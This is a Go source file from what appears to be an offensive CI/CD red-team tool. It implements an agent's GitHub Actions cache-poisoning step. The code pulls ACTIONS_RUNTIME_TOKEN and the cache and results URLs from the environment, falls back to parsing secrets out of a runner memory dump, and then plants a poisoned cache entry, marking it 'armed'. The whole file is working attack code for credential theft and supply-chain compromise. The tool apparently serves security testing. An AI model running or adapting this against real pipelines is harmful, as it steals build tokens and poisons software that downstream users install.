// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"strconv"
	"strings"
	"unicode"

	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
	"github.com/boostsecurityio/smokedmeat/internal/gump"
	"github.com/boostsecurityio/smokedmeat/internal/models"
)

func (a *Agent) executeCachePoison(ctx context.Context) error {
	if a.config.CachePoisonConfig == "" {
		a.cachePoison = nil
		return nil
	}

	cfg, err := cachepoison.DecodeDeploymentConfig(a.config.CachePoisonConfig)
	if err != nil {
		a.cachePoison = &models.CachePoisonStatus{Status: "failed", Error: err.Error()}
		return fmt.Errorf("decode config: %w", err)
	}

	runtimeEnv, runtimeSource, err := a.resolveCachePoisonRuntime()
	if err != nil {
		a.cachePoison = newCachePoisonStatus("failed", err.Error(), runtimeSource, runtimeEnv)
		return err
	}
	slog.Info("cache poison runtime",
		"source", runtimeSource,
		"token", summarizeRuntimeValue(runtimeEnv.RuntimeToken),
		"results_url", summarizeRuntimeValue(runtimeEnv.ResultsURL),
		"cache_url", summarizeRuntimeValue(runtimeEnv.CacheURL),
		"cache_service_v2", runtimeEnv.CacheServiceV2,
	)

	result, err := cachepoison.PoisonWithRuntime(ctx, cfg, runtimeEnv)
	if err != nil {
		a.cachePoison = newCachePoisonStatus("failed", err.Error(), runtimeSource, runtimeEnv)
		return err
	}

	a.cachePoison = newCachePoisonStatus("armed", "", runtimeSource, runtimeEnv)
	a.cachePoison.Key = result.Key
	a.cachePoison.Version = result.Version
	a.cachePoison.ArchiveSize = result.ArchiveSize
	slog.Info("cache poison armed", "key", result.Key, "version", result.Version, "size", result.ArchiveSize)
	return nil
}

func (a *Agent) resolveCachePoisonRuntime() (cachepoison.RuntimeEnvironment, string, error) {
	fromEnv := cachepoison.RuntimeEnvironment{
		RuntimeToken:   strings.TrimSpace(os.Getenv("ACTIONS_RUNTIME_TOKEN")),
		ResultsURL:     strings.TrimSpace(os.Getenv("ACTIONS_RESULTS_URL")),
		CacheURL:       strings.TrimSpace(os.Getenv("ACTIONS_CACHE_URL")),
		CacheServiceV2: true,
	}
	if fromEnv.Complete() {
		return fromEnv, "env", nil
	}

	dumper := a.dumpRunnerSecrets
	if dumper == nil {
		dumper = a.DumpRunnerSecrets
	}
	result := dumper()
	if result == nil {
		return fromEnv, "", fmt.Errorf("runner memory dump returned no result")
	}
	fromMemDump := runtimeEnvironmentFromMemDump(result)
	merged := fromEnv.Merge(fromMemDump)
	source := runtimeSource(fromEnv, fromMemDump)
	if source == "memdump" {
		if resultSource := runtimeResultSource(result); resultSource != "" {
			source = resultSource
		}
	}
	if merged.Complete() {
		return merged, source, nil
	}
	if result.Error != "" {
		return merged, source, fmt.Errorf("runner memory dump failed: %s", result.Error)
	}
	return merged, source, fmt.Errorf("actions cache runtime credentials not found in env or runner memory")
}

func runtimeEnvironmentFromMemDump(result *MemDumpResult) cachepoison.RuntimeEnvironment {
	var runtimeEnv cachepoison.RuntimeEnvironment
	if result == nil {
		return runtimeEnv
	}
	for _, raw := range result.Secrets {
		secret, err := gump.ParseSecret(raw)
		if err != nil {
			continue
		}
		applyRuntimeSetting(&runtimeEnv, secret.Name, secret.Value)
	}
	for _, raw := range result.Vars {
		variable, err := gump.ParseVar(raw)
		if err != nil {
			continue
		}
		applyRuntimeSetting(&runtimeEnv, variable.Name, variable.Value)
	}
	applyRuntimeEndpointSettings(&runtimeEnv, result.Endpoints)
	return runtimeEnv
}

func applyRuntimeEndpointSettings(runtimeEnv *cachepoison.RuntimeEnvironment, endpoints []gump.Endpoint) {
	if len(endpoints) == 0 {
		return
	}

	bestToken := strings.TrimSpace(runtimeEnv.RuntimeToken)
	bestResultsURL := strings.TrimSpace(runtimeEnv.ResultsURL)
	bestCacheURL := strings.TrimSpace(runtimeEnv.CacheURL)

	for _, endpoint := range endpoints {
		switch strings.TrimSpace(endpoint.EnvName) {
		case "ACTIONS_RUNTIME_TOKEN":
			value := normalizeRuntimeToken(endpoint.Value)
			if len(value) > len(bestToken) {
				bestToken = value
			}
		case "ACTIONS_RESULTS_URL":
			value := normalizeRuntimeValue(endpoint.Value)
			if len(value) > len(bestResultsURL) {
				bestResultsURL = value
			}
		case "ACTIONS_CACHE_URL":
			value := normalizeRuntimeValue(endpoint.Value)
			if len(value) > len(bestCacheURL) {
				bestCacheURL = value
			}
		case "ACTIONS_CACHE_SERVICE_V2":
			applyRuntimeSetting(runtimeEnv, endpoint.EnvName, endpoint.Value)
		}
	}

	if bestToken != "" {
		runtimeEnv.RuntimeToken = bestToken
	}
	if bestResultsURL != "" {
		runtimeEnv.ResultsURL = bestResultsURL
	}
	if bestCacheURL != "" {
		runtimeEnv.CacheURL = bestCacheURL
	}
}

func applyRuntimeSetting(runtimeEnv *cachepoison.RuntimeEnvironment, name, value string) {
	switch strings.TrimSpace(name) {
	case "ACTIONS_RUNTIME_TOKEN":
		runtimeEnv.RuntimeToken = normalizeRuntimeToken(value)
	case "ACTIONS_RESULTS_URL":
		runtimeEnv.ResultsURL = normalizeRuntimeValue(value)
	case "ACTIONS_CACHE_URL":
		runtimeEnv.CacheURL = normalizeRuntimeValue(value)
	case "ACTIONS_CACHE_SERVICE_V2":
		value = strings.ToLower(normalizeRuntimeValue(value))
		runtimeEnv.CacheServiceV2 = value != "" && value != "0" && value != "false" && value != "off"
	}
}

func normalizeRuntimeToken(value string) string {
	value = normalizeRuntimeValue(value)
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, value)
}

func normalizeRuntimeValue(value string) string {
	value = strings.TrimSpace(value)
	if strings.ContainsRune(value, '\\') {
		if unquoted, err := decodeRuntimeEscapes(value); err == nil {
			value = unquoted
		}
	}
	var cleaned strings.Builder
	cleaned.Grow(len(value))
	for _, r := range value {
		if r < 0x20 || r == 0x7f {
			continue
		}
		cleaned.WriteRune(r)
	}
	return strings.TrimSpace(cleaned.String())
}

func decodeRuntimeEscapes(value string) (string, error) {
	var decoded string
	if err := json.Unmarshal([]byte(`"`+strings.ReplaceAll(value, `"`, `\"`)+`"`), &decoded); err == nil {
		return decoded, nil
	}
	return strconv.Unquote(`"` + value + `"`)
}

func runtimeSource(fromEnv, fromMemDump cachepoison.RuntimeEnvironment) string {
	switch {
	case fromEnv.Complete():
		return "env"
	case fromMemDump.Complete():
		if hasRuntimeValues(fromEnv) {
			return "mixed"
		}
		return "memdump"
	case hasRuntimeValues(fromEnv):
		return "mixed"
	case hasRuntimeValues(fromMemDump):
		return "memdump"
	default:
		return ""
	}
}

func runtimeResultSource(result *MemDumpResult) string {
	if result == nil {
		return ""
	}
	hasProbe := false
	hasMemory := false
	for _, endpoint := range result.Endpoints {
		if strings.TrimSpace(endpoint.Source) != "" {
			hasProbe = true
		} else {
			hasMemory = true
		}
	}
	switch {
	case hasProbe && hasMemory:
		return "mixed"
	case hasProbe:
		return "probe"
	default:
		return ""
	}
}

func hasRuntimeValues(runtimeEnv cachepoison.RuntimeEnvironment) bool {
	return strings.TrimSpace(runtimeEnv.RuntimeToken) != "" ||
		strings.TrimSpace(runtimeEnv.ResultsURL) != "" ||
		strings.TrimSpace(runtimeEnv.CacheURL) != ""
}

func summarizeRuntimeValue(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return "absent"
	}
	sum := sha256.Sum256([]byte(value))
	return fmt.Sprintf("present:%d sha256:%s", len(value), hex.EncodeToString(sum[:6]))
}

func newCachePoisonStatus(status, errMsg, runtimeSource string, runtimeEnv cachepoison.RuntimeEnvironment) *models.CachePoisonStatus {
	return &models.CachePoisonStatus{
		Status:              status,
		Error:               errMsg,
		RuntimeSource:       runtimeSource,
		RuntimeTokenSummary: summarizeRuntimeValue(runtimeEnv.RuntimeToken),
		ResultsURLSummary:   summarizeRuntimeValue(runtimeEnv.ResultsURL),
		CacheURLSummary:     summarizeRuntimeValue(runtimeEnv.CacheURL),
	}
}
